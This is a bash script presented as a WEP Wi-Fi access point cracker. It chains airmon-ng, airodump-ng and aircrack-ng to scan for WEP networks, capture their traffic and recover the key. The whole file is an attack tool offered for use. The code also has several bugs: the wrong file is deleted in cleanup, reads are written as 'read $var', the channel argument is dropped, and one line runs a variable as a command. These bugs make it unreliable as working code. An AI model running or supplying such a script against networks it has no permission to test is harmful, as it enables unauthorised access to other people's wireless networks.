TMP_AIRODUMP_FILE="airodump.tmp"
TMP_CAPTURE_FILE="wep_captured.cap"
TMP_CRACK_RESULT="crack_result.tmp"

header() {
    clear
    echo "========================================\n"
    echo "WEP encrypted Wi-Fi Access Point Cracker\n"
    echo "========================================\n"    
}


cleanup() {
    # Delete the temporary files from past runs (if they exist)
    if [ -e $TMP_AIRODUMP_FILE ];
        then
        rm $TMP_AIRODUMP_FILE
    fi

    if [ -e $TMP_CAPTURE_FILE ];
        then
        rm $TMP_AIRODUMP_FILE
    fi
}


select_options() {
    echo "[!] Please select an option below to get started.\n\n"
    echo "1) Scan access points nearby and crack"
    echo "2) Crack access point with BSSID"
    echo "3) Crack previously captured data (if any)"
    echo "\nEnter your option: "
    read user_option

    find_wifi_interface
    start_interface_in_monitor_mode $interface

    if [[ "$user_option" = "1" ]];
        then
        header
        echo "[+] Scanning nearby access points..."
        # This makes the user select an access point and sets its BSSID in
        # $required_bssid
        scan_access_point $interface
        capture_data $interface $access_point_bssid $access_point_channel
        crack_access_point
    elif [[ "$user_option" = "2" ]];
        then
        header
        echo "[!] Enter BSSID of the access point:"
        read $access_point_bssid
        echo "[!] Enter channel of the access point:"
        read $access_point_channel
        capture_data $interface $access_point_bssid $access_point_channel
        crack_access_point
    elif [[ "$user_option" = "3" ]];
        then
        header
        crack_access_point
    fi
}


find_wifi_interface() {
    echo "[+] Looking for interfaces.."
    interface_count=`ifconfig | awk '/wlan.*/ {print $1}' | wc -w`

    if [[ $interface_count -le 0 ]];
        then
        echo "[!] No interfaces found. Manually enter name of interface:"
        read interface
    elif [[ $interface_count -ge 2 ]];
        then
        echo "[!] Select an interface from:"
        echo "`ifconfig | awk '/wlan.*/ {print \" \" $1}'`"
        read interface
    else
        interface=`ifconfig | awk '/wlan.*/ {print $1}'`
        echo "[+] Found interface $interface"
        echo "[+] Proceeding with $interface..."
    fi
}


start_interface_in_monitor_mode() {
    # We pass the interface name as argument. $1 contains that interface name
    airmon-ng start $1 >/dev/null
    sleep 2
}


scan_access_point() {
    echo "[+] Using $1 to scan for WEP-protected access points.."
    echo "[+] Press ENTER to stop scan"

    # Run the command in the background and redirect the outputs to both
    # the terminal screen and a temporary file (name set in $TMP_AIRODUMP_FILE)
    airodump-ng $1 | tee /dev/tty >> $TMP_AIRODUMP_FILE &
    read $enter_key
    # On hitting Enter key, kill the previous process
    kill -9 "$!"
    clear

    # Extract the access point names from the temporary file we just created
    access_points=`cat $TMP_AIRODUMP_FILE | awk '($8=="WEP") {print NR") "$11}'`
    echo "[!] Select an access point:"
    echo `$access_points`
    # Let the user select an access point
    read $access_point_number

    # Extract access point name from the number the user entered in the last step
    access_point_name=`echo $access_points | awk '($1==$access_point_number) {print $2}'`
    access_point_details=`cat $TMP_AIRODUMP_FILE | awk '($11==$access_point_name) {print $1, $6}'`

    # Extract the BSSID & channel of the access point
    access_point_bssid=`echo $access_point_details | awk '{print $1}'`
    access_point_channel=`echo $access_point_details | awk '{print $2}'`   
}


capture_data() {
    # Usage is airodump-ng <interface> -bssid <bssid> -c <channel> -w (filename)
    echo "[+] Capturing data from access point. Let the 'Data' exceed 20000"
    echo "[!] PRESS ENTER TO STOP CAPTURING.."

    if [ -e $TMP_CAPTURE_FILE ];
        then
        echo "Removing old capture file $TMP_CAPTURE_FILE"
        rm $TMP_CAPTURE_FILE
    fi

    airodump-ng $1 -bssid $2 -w $TMP_CAPTURE_FILE &
    read $enter_key
    kill -9 "$!"
}


crack_access_point() {
    echo "Press ENTER to quit cracking.."
    if [ -e $TMP_CAPTURE_FILE ];
        then
        aircrack-ng $TMP_CAPTURE_FILE &
        read $enter_key
        kill -9 "$!"
    else
        echo "No previously captured data file available"
        header
        select_options
    fi
}


# Display header and options
header
select_options

